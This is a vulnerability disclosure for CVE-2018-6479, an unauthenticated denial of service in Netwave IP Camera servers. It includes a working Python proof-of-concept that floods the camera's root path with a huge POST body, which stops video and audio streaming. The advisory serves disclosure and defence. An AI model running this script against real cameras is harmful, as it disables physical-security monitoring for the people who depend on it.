# Netwave IP Camera server vulnerable to unauthenticated Denial of Service via one single huge POST request on any firmware.

| CVE |Description|
| -------------|-------------|
|CVE-2018-6479|Unauthenticated remote Denial of Service vulnerability|

| CVSS  |Score| Details|
| -------------|-------------|-------------|
|3|7.3|CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:X/RL:W/RC:X|


#### 0. Introduction:

During an IoT security research, some vulnerabilities have been discovered on differnet IP camera vendors. Netwave IP Camera is a IP Camera server which allows to see camera video and administrate the camera. IP Cameras are used especially for physical security and control purposes, so it's availability is crucial.


#### 1. Denial of Service:

Any Netwave IP Camera can be taken down just by sending a huge POST request to its root path. Once you send the request, the device get stucked and stops streaming audio and video.

Proof of Concept: Run the following Python 2.7 script against any NetWave IP Camera, it will stop responding and streaming video/audio instantly.

```
import string
import httplib
import urllib2

host = "CAMERA_IP"
port = 80
params='A'*9999999 # Huge body

headers = { 
"Host": host + ':' + str(port),
"Connection": "keep-alive",
"Content-Length": 9999999,
}

url = "/"

conn = httplib.HTTPConnection(host,port=port)
conn.request("POST",url,params,headers)
response = conn.getresponse()
data = response.read()
print data
```

#### 2. Researcher:

Gonzalo García León

